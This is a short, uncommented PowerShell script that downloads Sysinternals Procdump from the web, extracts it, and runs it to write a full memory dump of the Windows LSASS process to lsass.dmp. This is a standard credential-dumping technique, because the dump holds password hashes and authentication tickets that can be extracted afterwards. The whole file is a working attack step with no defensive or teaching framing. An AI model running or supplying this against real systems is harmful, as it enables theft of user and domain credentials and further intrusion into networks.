Add-Type -A System.IO.Compression.FileSystem

Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "Procdump.zip"
[IO.Compression.ZipFile]::ExtractToDirectory('Procdump.zip', '.\Procdump')

& ".\Procdump\procdump64.exe" -accepteula  -ma lsass.exe lsass.dmp